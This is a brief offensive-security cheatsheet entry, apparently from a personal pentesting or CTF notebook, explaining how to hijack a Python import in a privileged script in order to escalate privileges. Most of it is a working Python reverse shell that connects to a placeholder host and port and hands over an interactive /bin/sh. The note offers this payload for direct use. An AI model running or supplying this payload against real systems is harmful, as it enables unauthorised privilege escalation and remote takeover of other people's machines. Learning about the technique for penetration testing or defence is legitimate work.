-----------------------------------------------
# Hijacking Imports
Tags:  #Cheatsheet #Coding 
Creation date: 2021-10-28

-----------------------------------------------

If a target has a [[python]] file with elevated privs that imports files, we can create a new file (contents below) with the name of the imported file to get a shell as whoever has the privs for the file.

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<host>",<port>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```